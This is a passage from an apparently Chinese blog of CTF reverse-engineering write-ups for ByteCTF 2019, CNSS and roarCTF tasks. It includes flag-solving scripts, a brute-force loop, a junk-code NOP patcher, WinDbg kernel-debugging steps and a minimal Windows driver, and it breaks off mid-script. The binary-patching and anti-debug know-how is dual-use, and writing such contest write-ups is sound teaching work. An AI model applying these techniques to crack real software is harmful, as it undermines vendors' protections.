alt="11"><br>首先是把输入与上面初始化的局部变量<br>逐个xor<br>然后开始平方<br>这边平方实现很奇葩看汇编看的<br>每个与最低位相乘后记录下值再与下一位加<br>连续循环8次<br><img src="12.png" alt="12"><br>最后就是比较<br>就是x*<em>2 - 7</em>y**2 == 8<br>然后关键就是解方程了。。。<br>z3解不出。。。只好去学习一波sage<br>sage不能约束求解没办法<br><img src="14.png" alt="14"><br>Mathematica<br>挺猛的<br>抽时间了解了解<br>最后写脚本就是多注意一个小端序问题</p><h2 id="丛林的秘密"><a href="#丛林的秘密" class="headerlink" title="丛林的秘密"></a>丛林的秘密</h2><p>题目是个apk，解压后分析so库<br>可以发现在动态解密一个html文件<br>里面调用了wasm<br>机器码复制出来反编译成c<br>这边填了个坑<br>一开始是用<br>./wasm2c 1.wasm -o 1.c<br>然后反编译时疯狂报错<br>后来经室友一起查看<br>发现是因为名称不能以数字打头<br>他会修改一些神奇的宏定义<br>改成./wasm2c 1.wasm -o a.c即可<br>仔细分析发现逻辑并不复杂</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">a = [<span class="hljs-number">83,48,109,51</span>,<span class="hljs-number">116,105,109,101</span>,<span class="hljs-number">95,108,49,116</span>,<span class="hljs-number">116,49,101,95</span>,<span class="hljs-number">99,48,100,101</span>,<span class="hljs-number">95,49,115,95</span>,<span class="hljs-number">117,115,51,102</span>,<span class="hljs-number">117,108,51,51</span>]<br>b = [<span class="hljs-number">0x18,0x9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>x6b,<span class="hljs-number">0</span>x1,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0x32,0x57</span>,<span class="hljs-number">0</span>x30,<span class="hljs-number">0</span>x5d,<span class="hljs-number">0x40,0x46</span>,<span class="hljs-number">0</span>x2b,<span class="hljs-number">0x46,0x56</span>,<span class="hljs-number">0</span>x3d,<span class="hljs-number">0x2,0x43</span>,<span class="hljs-number">0x17,0x0</span>,<span class="hljs-number">0x32,0x53</span>,<span class="hljs-number">0</span>x1f,<span class="hljs-number">0</span>x26,<span class="hljs-number">0</span>x2a,<span class="hljs-number">0x1,0x0</span>,<span class="hljs-number">0x10,0x10</span>,<span class="hljs-number">0</span>x1e,<span class="hljs-number">0x40,0x00</span>]<br>flag = &#x27;&#x27;<br>for i in range(len(a)):<br>    flag += chr(a[i]^b[i])<br>print flag<br></code></pre></td></tr></table></figure><h1 id="BYTECTF-2019"><a href="#BYTECTF-2019" class="headerlink" title="BYTECTF 2019"></a>BYTECTF 2019</h1><h2 id="NaughtyBoy"><a href="#NaughtyBoy" class="headerlink" title="NaughtyBoy"></a>NaughtyBoy</h2><p>apk逆向看了段时间<br>感觉不是一道太难的题目<br>来详细写下wp<br>//这边顺带夸一下不愧是r3得题，能学到好多<br>jeb里看不到什么，主要是看so库<br><img src="1.png" alt="1"><br>可以看到比较开头字符串和花括号<br><img src="2.png" alt="2"><br>下面这个其实就是单纯得长度验证，要为3得倍数<br>然后进如check函数<br>进check之前还有一个sub_400ADE函数是初始化<br>首先是初始化地图，复制粘贴一下打出来即可<br>注意一下里面的antidebug2函数<br>初始化了全局变量byte_5004 = 0;<br>这在最后验证时有用<br>下面来看下check<br>一开始会对前四个字节进行解密操作<br>然后开始游戏<br>其实是一个变种的推箱子游戏<br>具体规则是每三个输入为一次<br>前俩个输入是坐标<br>会检查你当前的坐标是否是O<br>第三个输入是行为<br>这边为检查你行为的那边是否为O<br>比如你输入1往上走就检查你上面是否为O<br>然后你的位置与你上面的O被清空成路线，你上上方向变为O，类似推箱子<br>这样再看看地图可以推出来初始位置必须是5,3<br>且必须往上走<br>这样就可以进行爆破</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs smali">unsigned char byte_500C[0x40] = &#123;0&#125;;<br><br>int __fastcall shift(int result)<br>&#123;<br>  char v1; // r2<br>  char v2; // r3<br>  char v3; // r12<br> <span class="hljs-built_in"> int </span>v4; // r1<br><br>  v1 = *(_BYTE *)(result + 1);<br>  v2 = *(_BYTE *)(result + 2);<br>  v3 = *(_BYTE *)(result + 3);<br>  *(_BYTE *)result ^= 0x87u;<br>  *(_BYTE *)(result + 1) = v1 ^ 0x42;<br>  *(_BYTE *)(result + 2) = v2 ^ 0x71;<br>  *(_BYTE *)(result + 3) = v3 ^ 0x48;<br>  v4 = *(_DWORD *)result ^ (*(_DWORD *)result &gt;&gt; 4) &amp; 0x3333333;<br>  *(_DWORD *)result = v4 ^ 2 * v4 &amp; 0xBEEFDEAC ^ ((v4 ^ 2 * v4 &amp; 0xBEEFDEAC) &gt;&gt; 15) &amp; 0x1BEEF;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br>int callfunc(unsigned __int8 *a1)<br>&#123;<br>   <span class="hljs-built_in"> return </span>shift((int)a1);<br>&#125;<br>int __fastcall sub_4008D0(int *a1)<br>&#123;<br> <span class="hljs-built_in"> int </span>v1; // r1<br> <span class="hljs-built_in"> int </span>v2; // r1<br><br>  v1 = *a1;<br> <span class="hljs-built_in"> if </span>( *a1 &lt;&lt; 31 )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( v1 &amp; 2 )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( v1 &amp; 4 )<br>      &#123;<br>       <span class="hljs-built_in"> if </span>( v1 &amp; 8 )<br>        &#123;<br>         <span class="hljs-built_in"> if </span>( v1 &amp; 0x10 )<br>          &#123;<br>           <span class="hljs-built_in"> if </span>( v1 &amp; 0x20 )<br>            &#123;<br>             <span class="hljs-built_in"> if </span>( v1 &amp; 0x40 )<br>                v2 = v1 &amp; 0xFFFFFF00 | 0x80;<br>              else<br>                v2 = v1 &amp; 0xFFFFFF80 | 0x40;<br>            &#125;<br>            else<br>            &#123;<br>              v2 = v1 &amp; 0xFFFFFFC0 | 0x20;<br>            &#125;<br>          &#125;<br>          else<br>          &#123;<br>            v2 = v1 &amp; 0xFFFFFFE0 | 0x10;<br>          &#125;<br>        &#125;<br>        else<br>        &#123;<br>          v2 = v1 &amp; 0xFFFFFFF0 | 8;<br>        &#125;<br>      &#125;<br>      else<br>      &#123;<br>        v2 = v1 &amp; 0xFFFFFFF8 | 4;<br>      &#125;<br>    &#125;<br>    else<br>    &#123;<br>      v2 = v1 &amp; 0xFFFFFFFC | 2;<br>    &#125;<br>  &#125;<br>  else<br>  &#123;<br>    v2 = v1 | 1;<br>  &#125;<br>  *a1 = v2;<br> <span class="hljs-built_in"> return </span>v2;<br>&#125;<br>int main()<br>&#123;<br>    unsigned char flag[4];<br>   <span class="hljs-built_in"> int </span>i;<br>    char temp1,temp2,temp3,temp4;<br>    for(temp1=32;temp1&lt;125;temp1++)<br>    &#123;<br><br>        for(temp2=32;temp2&lt;125;temp2++)<br>    &#123;<br><br>        for(temp3=32;temp3&lt;125;temp3++)<br>    &#123;<br>        for(temp4=32;temp4&lt;125;temp4++)<br>    &#123;<br>        flag[0] = temp1;<br>        flag[1] = temp2;<br>        flag[2] = temp3;<br>        flag[3] = temp4;<br>        callfunc(flag);<br>        if(flag[0]==52&amp;&amp;flag[1]==53&amp;&amp;flag[2]==49&amp;&amp;flag[3]==50)<br>        &#123;<br>            printf(<span class="hljs-string">&quot;%c%c%c%c\n&quot;</span>,temp1,temp2,temp3,temp4);<br>        &#125;<br><br>    &#125;<br><br>    &#125;<br><br>    &#125;<br><br>    &#125;<br>   <span class="hljs-built_in"> return </span>0;<br>&#125;<br></code></pre></td></tr></table></figure><p>爆破出前四个为good<br>然后看下最终验证<br><img src="4.png" alt="4"><br>就是检查第24位是否为O<br>那很简单了照这样走下去就行<br>最终flag<br>bytectf{good53233212414531}<br><img src="5.png" alt="5"></p><h2 id="驱动逆向"><a href="#驱动逆向" class="headerlink" title="驱动逆向"></a>驱动逆向</h2><p>驱动逆向写起来还是有点恐怖的。。。<br>踩了很多坑<br>首先最重要的就是调试<br>虚拟机配好环境后用windbg连<br>设置好entrypoint然后再虚拟机中加载sys驱动<br>windbg成功断下<br>改下参数后就可以解密了<br><img src="6.jpg" alt="6"><br>下面写下大致调试步骤<br>管理员运行windbg<br>File -&gt; Kernel Debugging -&gt; com<br><img src="7.png" alt="7"><br>照样配置好<br>然后能看到回显<br><img src="8.png" alt="8"><br>下面点击break<br><img src="9.png" alt="9"><br>这边已经连接上了<br>然后设置断点</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">bp</span> 驱动模块名称+驱动PE结构入口点函数偏移<br><span class="hljs-comment">// 如：bp DriverEnum+0x1828</span><br></code></pre></td></tr></table></figure><p>bp DancingKeys+0x8000<br>接下去输入g<br>让虚拟机运行<br>然后加载驱动<br>本来是想c语言写了编译运行后加载驱动<br>但是失败了<br>后来问了下夜影师傅。。。。。。成功填坑<br>下面就是基本调试了</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">lm ：表示列举虚拟机加载和卸载的内核模块起始地址和结束地址。<br>bu、bp ：下断点。<br>u、uf ：反汇编指定地址处的代码。<br>dd ： 查看指定地址处的数据。<br>dt ： 查看数据类型定义。<br><span class="hljs-symbol">F10:</span>  步过<br><span class="hljs-symbol">F11:</span>  步入<br><span class="hljs-symbol">ed:</span>   修改值<br><span class="hljs-symbol">dd:</span>   以dd显示值<br></code></pre></td></tr></table></figure><h3 id="驱动学习"><a href="#驱动学习" class="headerlink" title="驱动学习"></a>驱动学习</h3><p>学习一波驱动编程<br>以后可以出点沙雕赛题<br>当然肯定不会一次性学完的。。。慢慢来<br>下面是最基本的驱动</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;ntddk.h&gt;<br>NTSTATUS <span class="hljs-constructor">Unload(PDRIVER_OBJECT <span class="hljs-params">driver</span>)</span><br>&#123;<br><span class="hljs-constructor">DbgPrint(<span class="hljs-string">&quot;BYE&quot;</span>)</span>;<br>return STATUS_SUCCESS;<br>&#125;<br>NTSTATUS <span class="hljs-constructor">DriverEntry(PDRIVER_OBJECT <span class="hljs-params">driver</span>, PUNICODE_STRING <span class="hljs-params">reg_path</span>)</span><br>&#123;<br><span class="hljs-constructor">DbgPrint(<span class="hljs-string">&quot;HELLO&quot;</span>)</span>;<br>return STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>特别简单啊和linux内核模块编程差不多<br>一个入口函数和卸载函数<br>卸载函数不写的话只能关机卸载了。。。</p><h2 id="Android逆向"><a href="#Android逆向" class="headerlink" title="Android逆向"></a>Android逆向</h2><p>稍微结合着视频教程学了会<br>大致了解了安卓的架构(不然有时候问问题听都听不懂)<br><img src="15.png" alt="15"><br>主要还是基于linux内核<br>还有平时逆向分析中分析native和java层<br>这个其实早就知道了。。。就是不知道为啥。。。算是填坑了<br><img src="16.png" alt="16"></p><h1 id="cnss"><a href="#cnss" class="headerlink" title="cnss"></a>cnss</h1><p>cnss是电子科大给新生的一个平台<br>有道不错的题目可以康康<br><img src="17.png" alt="17"><br>这道题目过了俩天还是没人出<br>当时拿到题目算了下时间，30分钟出的flag<br>难度确实有点，但都是基础可以秒<br><img src="18.png" alt="18"><br>大致流程如上<br>smc_init中有mprotect函数明显修改权限<br>下面有个pwdcheck<br>看下<br><img src="19.png" alt="19"><br>其实是个原装的sm4算法<br>百度c源码直接解出pwd<br>key和最终比较都给了<br><img src="20.png" alt="20"><br>然后是最后的smc操作<br>看上去操作很简单事实上是迷惑行为<br>调试发现是个vm<br>//个人总结了vm的速写法，很快就能看出来在干啥<br>就是把输入与之前的pwd xor<br>然后比较<br>不难，但是能让人眼前一亮<br>和国赛那个bbvvmm有神似之处<br>需要对加密算法熟知，当然你即使不知道这是sm4可以直接百度特征码</p><p>又上了道题<br>关于花的<br>有一说一，这平台题目确实不错，题出的挺好<br>特别是最近这俩题<br>说下这个junkcode</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">a = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0&#123;&#125;_!~?,.&#x27;</span><br>t1 = [<span class="hljs-number">0x000ed02e</span>,<span class="hljs-number">0x0014519f</span>,<span class="hljs-number">0x00173801</span>,<span class="hljs-number">0x00173801</span>,<span class="hljs-number">0x001c683c</span>,<span class="hljs-number">0x0002aebe</span>,<span class="hljs-number">0x00169d98</span>,<span class="hljs-number">0x001872b0</span>,<span class="hljs-number">0x0017d3cd</span>,<span class="hljs-number">0x000fb9dc</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00053d52</span>,<span class="hljs-number">0x0001b055</span>,<span class="hljs-number">0x00169d98</span>,<span class="hljs-number">0x000ed02e</span>,<span class="hljs-number">0x000fb9dc</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00028ad0</span>,<span class="hljs-number">0x0014e08c</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00053d52</span>,<span class="hljs-number">0x000400e9</span>,<span class="hljs-number">0x000ed02e</span>,<span class="hljs-number">0x0012b367</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00063088</span>,<span class="hljs-number">0x001872b0</span>,<span class="hljs-number">0x0014519f</span>,<span class="hljs-number">0x0002064f</span>,<span class="hljs-number">0x000d16fa</span>,<span class="hljs-number">0x00049854</span>,<span class="hljs-number">0x0014e08c</span>,<span class="hljs-number">0x0004ccef</span>,<span class="hljs-number">0x000fb9dc</span>,<span class="hljs-number">0x001dcfeb</span>]<br>a1 = [<span class="hljs-number">0x000DEF38</span>,<span class="hljs-number">0x000E5DB5</span>,<span class="hljs-number">0x000ED02E</span>,<span class="hljs-number">0x000F4429</span>,<span class="hljs-number">0x000FB9DC</span>,<span class="hljs-number">0x0010330E</span>,<span class="hljs-number">0x0010ADF3</span>,<span class="hljs-number">0x00112C92</span>,<span class="hljs-number">0x0011AC91</span>,<span class="hljs-number">0x00122E46</span>,<span class="hljs-number">0x0012B367</span>,<span class="hljs-number">0x001339DB</span>,<span class="hljs-number">0x0013C416</span>,<span class="hljs-number">0x0014519F</span>,<span class="hljs-number">0x0014E08C</span>,<span class="hljs-number">0x001572C3</span>,<span class="hljs-number">0x0016068B</span>,<span class="hljs-number">0x00169D98</span>,<span class="hljs-number">0x00173801</span>,<span class="hljs-number">0x0017D3CD</span>,<span class="hljs-number">0x001872B0</span>,<span class="hljs-number">0x001914F1</span>,<span class="hljs-number">0x0019B886</span>,<span class="hljs-number">0x001A6136</span>,<span class="hljs-number">0x001B0B25</span>,<span class="hljs-number">0x001BB82B</span>,<span class="hljs-number">0x0001CCDB</span>,<span class="hljs-number">0x0001E827</span>,<span class="hljs-number">0x0002064F</span>,<span class="hljs-number">0x00022559</span>,<span class="hljs-number">0x000246FC</span>,<span class="hljs-number">0x0002677C</span>,<span class="hljs-number">0x00028AD0</span>,<span class="hljs-number">0x0002AEBE</span>,<span class="hljs-number">0x0002D36C</span>,<span class="hljs-number">0x0004325F</span>,<span class="hljs-number">0x000463FC</span>,<span class="hljs-number">0x00049854</span>,<span class="hljs-number">0x0004CCEF</span>,<span class="hljs-number">0x00050401</span>,<span class="hljs-number">0x00053D52</span>,<span class="hljs-number">0x00057717</span>,<span class="hljs-number">0x0005B355</span>,<span class="hljs-number">0x0005F1B4</span>,<span class="hljs-number">0x00063088</span>,<span class="hljs-number">0x00067189</span>,<span class="hljs-number">0x0006B49C</span>,<span class="hljs-number">0x0006F836</span>,<span class="hljs-number">0x00073FDF</span>,<span class="hljs-number">0x000787AC</span>,<span class="hljs-number">0x0007D183</span>,<span class="hljs-number">0x00081DA9</span>,<span class="hljs-number">0x00086BD6</span>,<span class="hljs-number">0x0008BA1F</span>,<span class="hljs-number">0x00090C8A</span>,<span class="hljs-number">0x000960CD</span>,<span class="hljs-number">0x0009B52E</span>,<span class="hljs-number">0x000A0DA3</span>,<span class="hljs-number">0x000A67F1</span>,<span class="hljs-number">0x000AC440</span>,<span class="hljs-number">0x000B2065</span>,<span class="hljs-number">0x0001B055</span>,<span class="hljs-number">0x001C683C</span>,<span class="hljs-number">0x001DCFEB</span>,<span class="hljs-number">0x000D16FA</span>,<span class="hljs-number">0x00008D9E</span>,<span class="hljs-number">0x001E8784</span>,<span class="hljs-number">0x0003D223</span>,<span class="hljs-number">0x00014D71</span>,<span class="hljs-number">0x00017C33</span>]<br>f = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">for i in range(35):</span><br><span class="hljs-string">    for j in range(len(a1)):</span><br><span class="hljs-string">        if t1[i] == a1[j]:</span><br><span class="hljs-string">            f += a[j]</span><br><span class="hljs-string">            break</span><br><span class="hljs-string">print f</span><br><span class="hljs-string">print len(f)</span><br><span class="hljs-string">#cnss&#123;8rute_F0rce_7o_F@ck_Jun3_CoDe&#125;</span><br></code></pre></td></tr></table></figure><p>直接打表解决，我打的表漏了个@。。。但是能猜出来<br>主要的花是俩种<br>一个是call影响栈指针<br><img src="22.png" alt="22"><br>还有一个就是普通的垃圾填充了<br><img src="23.png" alt="23"><br>全部填充nop即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span> = open(‘run.exe’,’rb’).read()<br><span class="hljs-attribute">data</span> = data.replace(‘\x<span class="hljs-number">60</span>\x<span class="hljs-number">61</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">50</span>\x<span class="hljs-number">58</span>\x<span class="hljs-number">53</span>\x<span class="hljs-number">5</span>b’,’\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>\x<span class="hljs-number">90</span>’) #花指令机器码替换为nop<br><span class="hljs-attribute">open</span>(‘run_dejunk.exe’,’wb’).write(data)<br></code></pre></td></tr></table></figure><p>jmp的辣鸡代码写不出脚本。。。如果单纯匹配机器码的话有其他指令也会存在0xE8<br>然后就是具体判断<br><img src="24.png" alt="24"><br>就在这<br>具体加密在<br><img src="25.png" alt="25"><br>观察汇编即可发现每次加密一个字节<br>加密完就比较<br>所以可以打表来写这题。。。<br>但这也正是这题想表达的junkcode，题目出的挺不错的。<br>如果加密出的难一点可能会死一片<br>好在是exe，换成elf angr一跑就出</p><p>又上了一题<br>我佛了<br>暂时日不出。。。<br>主要是壳。。。<br>upx 3.95最新的壳<br>估计改了什么东西。。。<br>//以前遇到壳直接脱壳机的我现在gg了<br>但是upx -d还是能脱但是不能运行<br>不像是自校验。。。<br>静态分析发现有花，花还是好去的<br><img src="26.png" alt="26"><br>就是返回到shr     ebx, 7指令+1处<br>直接patch完<br><img src="27.png" alt="27"><br>可以看到大致流程是先判断是不是cnss{}格式<br>长度为38<br><img src="28.png" alt="28"><br>然后进行取表后xor操作。。。<br>最后直接比较判断。。。<br>由于不能调试很蛋疼。。。看不太懂。。。<br>没办法，只好去学一波脱壳了<br>//day2<br>脱壳是不可能的<br>这辈子都不可能的<br>调试了一波<br>发现有类似反调试的东西，直接忽略了<br><img src="29.png" alt="29"><br>看完后整体逻辑大致如上<br>有一种crc128的感觉<br>实在不知道怎么逆向<br>问了下出题人果然。。。就是个crc<br>学一波crc<br>//10.20<br>打巅峰极客比赛暂时咕咕咕<br>看了波crc32感觉逆不了<br>后来得知当消息长度小于等于验证长度即可逆向。。。<br>佛了，赶紧学一波<br>好吧。。。tctf 2019原题<br>是个密码逆向。。。搞不来</p><h1 id="roarCTF"><a href="#roarCTF" class="headerlink" title="roarCTF"></a>roarCTF</h1><p>逆向签到。。。实在太菜了后面写不出啥</p><h2 id="polyre"><a href="#polyre" class="headerlink" title="polyre"></a>polyre</h2><p>是个很恐怖的ollvm。。。<br>学到了点新东西<br>拿到ollvm的题一般我都是猜。。。<br>扫了一眼大致看了看判断在memcmp那<br>下断点输入一堆a发现每8个byte出现了重复<br>那就是说每8byte加密一次<br>然后具体看看啥加密<br>在所有有操作命令处下断点然后看。。。发现是把每八个输入看成long int<br>然后不断地*2 ^0xB0004B7679FA26B3LL<br>调试了发现没有规律可循就懵逼了。。。当时才打完公测。。。比较晕<br>就没有继续看，后来在学长的告知下发现有个工具。。。<br>以前看过那个腾讯安全发的文章。。。然后工具不能用<br>后才来知道怎么用。。。<br>用工具反混淆后好看了很多<br><img src="21.png" alt="21"><br>其实是看成了signed long int<br>然后判断是否大于等于0<br>大于则乘2<br>否则乘2后xor<br>64次后进行比较<br>因为有溢出。。。写逆算法时懵逼了<br>后来发现可逆。。。通过判断奇偶来选择高位补<br>裂开来</p><h2 id="Tank"><a href="#Tank" class="headerlink" title="Tank"></a>Tank</h2><p>开坦克。。。<br>直接看dll<br>主要逻辑就是爆破，当时逻辑分析出来了就是不知道为什么写脚本一直有问题就没有爆破出<br>后来还是整出来了<br>我佛了</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import hashlib<br><br>data = [<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>],<br>    [<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span 